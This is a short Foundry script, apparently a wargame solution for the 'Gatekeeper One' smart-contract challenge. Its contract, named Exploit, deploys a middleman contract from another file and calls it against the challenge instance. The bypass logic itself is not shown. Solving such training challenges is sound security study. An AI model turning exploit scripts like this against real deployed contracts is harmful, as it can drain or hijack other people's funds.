// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

import {GatekeeperOneMiddleman} from "../src/Level13.sol";

// ================================================================
// │                    LEVEL 13 - GATEKEEPER ONE                 │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();
        GatekeeperOneMiddleman gatekeeperOneMiddleman = new GatekeeperOneMiddleman();
        gatekeeperOneMiddleman.run(targetContractAddress);
        vm.stopBroadcast();
    }
}
